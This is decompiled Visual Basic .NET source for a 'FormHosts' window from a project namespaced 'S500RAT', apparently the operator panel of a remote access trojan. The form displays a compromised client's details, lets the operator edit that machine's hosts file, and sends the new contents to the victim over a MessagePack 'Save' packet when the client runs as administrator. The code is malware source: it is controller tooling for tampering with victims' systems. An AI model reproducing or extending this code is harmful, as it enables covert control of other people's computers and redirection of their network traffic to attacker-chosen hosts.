Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x02000038 RID: 56
	<DesignerGenerated()>
	Public Partial Class FormHosts
		Inherits Form

		' Token: 0x06000FBD RID: 4029 RVA: 0x0008919C File Offset: 0x0008739C
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.Hosts_Load
			AddHandler MyBase.Resize, AddressOf Me.Hosts_Resize
			Me.FormSize = False
			Me.InitializeComponent()
		End Sub

		' Token: 0x1700066D RID: 1645
		' (get) Token: 0x06000FC0 RID: 4032 RVA: 0x00089C98 File Offset: 0x00087E98
		' (set) Token: 0x06000FC1 RID: 4033 RVA: 0x00089CA4 File Offset: 0x00087EA4
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x1700066E RID: 1646
		' (get) Token: 0x06000FC2 RID: 4034 RVA: 0x00089CE7 File Offset: 0x00087EE7
		' (set) Token: 0x06000FC3 RID: 4035 RVA: 0x00089CF1 File Offset: 0x00087EF1
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x1700066F RID: 1647
		' (get) Token: 0x06000FC4 RID: 4036 RVA: 0x00089CFA File Offset: 0x00087EFA
		' (set) Token: 0x06000FC5 RID: 4037 RVA: 0x00089D04 File Offset: 0x00087F04
		Private Overridable Property ClientInfo As Label

		' Token: 0x17000670 RID: 1648
		' (get) Token: 0x06000FC6 RID: 4038 RVA: 0x00089D0D File Offset: 0x00087F0D
		' (set) Token: 0x06000FC7 RID: 4039 RVA: 0x00089D17 File Offset: 0x00087F17
		Friend Overridable Property Guna2ResizeBox1 As Guna2ResizeBox

		' Token: 0x17000671 RID: 1649
		' (get) Token: 0x06000FC8 RID: 4040 RVA: 0x00089D20 File Offset: 0x00087F20
		' (set) Token: 0x06000FC9 RID: 4041 RVA: 0x00089D2C File Offset: 0x00087F2C
		Public Overridable Property T1 As UIRichTextBox
			<CompilerGenerated()>
			Get
				Return Me._T1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UIRichTextBox)
				Dim value2 As EventHandler = AddressOf Me.T1_TextChanged
				Dim t As UIRichTextBox = Me._T1
				If t IsNot Nothing Then
					RemoveHandler t.TextChanged, value2
				End If
				Me._T1 = value
				t = Me._T1
				If t IsNot Nothing Then
					AddHandler t.TextChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000672 RID: 1650
		' (get) Token: 0x06000FCA RID: 4042 RVA: 0x00089D6F File Offset: 0x00087F6F
		' (set) Token: 0x06000FCB RID: 4043 RVA: 0x00089D7C File Offset: 0x00087F7C
		Friend Overridable Property SaveSetttings As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._SaveSetttings
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.SaveSetttings_Click
				Dim saveSetttings As Guna2GradientButton = Me._SaveSetttings
				If saveSetttings IsNot Nothing Then
					RemoveHandler saveSetttings.Click, value2
				End If
				Me._SaveSetttings = value
				saveSetttings = Me._SaveSetttings
				If saveSetttings IsNot Nothing Then
					AddHandler saveSetttings.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000673 RID: 1651
		' (get) Token: 0x06000FCC RID: 4044 RVA: 0x00089DBF File Offset: 0x00087FBF
		' (set) Token: 0x06000FCD RID: 4045 RVA: 0x00089DCC File Offset: 0x00087FCC
		Friend Overridable Property State As LinkLabel
			<CompilerGenerated()>
			Get
				Return Me._State
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As LinkLabel)
				Dim value2 As LinkLabelLinkClickedEventHandler = AddressOf Me.State_LinkClicked
				Dim state As LinkLabel = Me._State
				If state IsNot Nothing Then
					RemoveHandler state.LinkClicked, value2
				End If
				Me._State = value
				state = Me._State
				If state IsNot Nothing Then
					AddHandler state.LinkClicked, value2
				End If
			End Set
		End Property

		' Token: 0x17000674 RID: 1652
		' (get) Token: 0x06000FCE RID: 4046 RVA: 0x00089E0F File Offset: 0x0008800F
		' (set) Token: 0x06000FCF RID: 4047 RVA: 0x00089E19 File Offset: 0x00088019
		Friend Overridable Property Timer2 As System.Windows.Forms.Timer

		' Token: 0x17000675 RID: 1653
		' (get) Token: 0x06000FD0 RID: 4048 RVA: 0x00089E22 File Offset: 0x00088022
		' (set) Token: 0x06000FD1 RID: 4049 RVA: 0x00089E2C File Offset: 0x0008802C
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x17000676 RID: 1654
		' (get) Token: 0x06000FD2 RID: 4050 RVA: 0x00089E35 File Offset: 0x00088035
		' (set) Token: 0x06000FD3 RID: 4051 RVA: 0x00089E3F File Offset: 0x0008803F
		Friend Overridable Property MAX As ValleyMax

		' Token: 0x17000677 RID: 1655
		' (get) Token: 0x06000FD4 RID: 4052 RVA: 0x00089E48 File Offset: 0x00088048
		' (set) Token: 0x06000FD5 RID: 4053 RVA: 0x00089E54 File Offset: 0x00088054
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000678 RID: 1656
		' (get) Token: 0x06000FD6 RID: 4054 RVA: 0x00089E97 File Offset: 0x00088097
		' (set) Token: 0x06000FD7 RID: 4055 RVA: 0x00089EA1 File Offset: 0x000880A1
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x17000679 RID: 1657
		' (get) Token: 0x06000FD8 RID: 4056 RVA: 0x00089EAA File Offset: 0x000880AA
		' (set) Token: 0x06000FD9 RID: 4057 RVA: 0x00089EB4 File Offset: 0x000880B4
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x1700067A RID: 1658
		' (get) Token: 0x06000FDA RID: 4058 RVA: 0x00089EBD File Offset: 0x000880BD
		' (set) Token: 0x06000FDB RID: 4059 RVA: 0x00089EC7 File Offset: 0x000880C7
		Public Property Client As Clients

		' Token: 0x1700067B RID: 1659
		' (get) Token: 0x06000FDC RID: 4060 RVA: 0x00089ED0 File Offset: 0x000880D0
		' (set) Token: 0x06000FDD RID: 4061 RVA: 0x00089EDA File Offset: 0x000880DA
		Public Property F As FormS500

		' Token: 0x1700067C RID: 1660
		' (get) Token: 0x06000FDE RID: 4062 RVA: 0x00089EE3 File Offset: 0x000880E3
		' (set) Token: 0x06000FDF RID: 4063 RVA: 0x00089EED File Offset: 0x000880ED
		Public Property FullPath As String

		' Token: 0x1700067D RID: 1661
		' (get) Token: 0x06000FE0 RID: 4064 RVA: 0x00089EF6 File Offset: 0x000880F6
		' (set) Token: 0x06000FE1 RID: 4065 RVA: 0x00089F00 File Offset: 0x00088100
		Friend Property ParentClient As Clients

		' Token: 0x1700067E RID: 1662
		' (get) Token: 0x06000FE2 RID: 4066 RVA: 0x00089F09 File Offset: 0x00088109
		' (set) Token: 0x06000FE3 RID: 4067 RVA: 0x00089F13 File Offset: 0x00088113
		Public Property Admin As Boolean

		' Token: 0x1700067F RID: 1663
		' (get) Token: 0x06000FE4 RID: 4068 RVA: 0x00089F1C File Offset: 0x0008811C
		' (set) Token: 0x06000FE5 RID: 4069 RVA: 0x00089F26 File Offset: 0x00088126
		Public Property StringHosts As String

		' Token: 0x06000FE6 RID: 4070 RVA: 0x00089F30 File Offset: 0x00088130
		Private Sub Hosts_Load(sender As Object, e As EventArgs)
			Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
			Try
				Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(4) })
			Catch ex As Exception
				Me.ClientInfo.Text = "Not found !"
			End Try
			Me.FormSize = True
			Me.MinimumSize = MyBase.Size
		End Sub

		' Token: 0x06000FE7 RID: 4071 RVA: 0x0008A018 File Offset: 0x00088218
		Private Sub Hosts_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x06000FE8 RID: 4072 RVA: 0x0008A0AC File Offset: 0x000882AC
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.ParentClient.TcpClient.Connected OrElse Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x06000FE9 RID: 4073 RVA: 0x0008A118 File Offset: 0x00088318
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
				MyBase.Close()
			End Sub)
		End Sub

		' Token: 0x06000FEA RID: 4074 RVA: 0x0008A130 File Offset: 0x00088330
		Private Sub SaveSetttings_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.Admin
			If flag Then
				MessageBox.Show("The client is not running as an administrator so you can't edit hosts!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
			Else
				Try
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "Save"
					msgPack.ForcePathObject("Txt").AsString = Me.T1.Text.ToString()
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				Catch ex As Exception
				End Try
			End If
		End Sub

		' Token: 0x06000FEB RID: 4075 RVA: 0x0008A1DC File Offset: 0x000883DC
		Private Sub State_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs)
			Me.State.Text = "..."
			Me.State.LinkColor = Color.White
		End Sub

		' Token: 0x06000FEC RID: 4076 RVA: 0x0008A201 File Offset: 0x00088401
		Private Sub T1_TextChanged(sender As Object, e As EventArgs)
			Me.SaveSetttings.Enabled = True
		End Sub

		' Token: 0x04000723 RID: 1827
		Private FormSize As Boolean
	End Class
End Namespace
